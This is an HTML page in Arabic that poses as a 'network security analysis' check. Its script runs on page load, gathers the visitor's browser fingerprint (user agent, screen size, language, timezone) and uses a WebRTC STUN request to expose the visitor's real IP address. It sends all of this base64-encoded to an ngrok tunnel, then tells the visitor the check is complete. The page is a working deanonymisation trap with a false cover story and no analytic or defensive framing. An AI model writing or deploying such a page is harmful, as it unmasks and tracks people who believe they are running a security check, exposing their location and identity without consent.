<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحليل أمان الشبكة</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 15%; }
        .spinner { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div id="status">جاري التحقق من بروتوكولات الأمان...</div>

    <script>
        const GATEWAY = "https://c4d888980073.ngrok-free.app";

        async function startCapture() {
            let info = {
                ua: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`,
                lang: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

           
            const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = ipRegex.exec(e.candidate.candidate);
                    if (match) info.real_ip = match[1];
                } else {
                     
                    const payload = btoa(JSON.stringify(info));
                    fetch(`${GATEWAY}?data=${payload}`, { mode: 'no-cors' });
                    document.getElementById('status').innerText = "تم التحقق. يمكنك العودة الآن.";
                }
            };
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
        }

        window.onload = startCapture;
    </script>
</body>
</html>
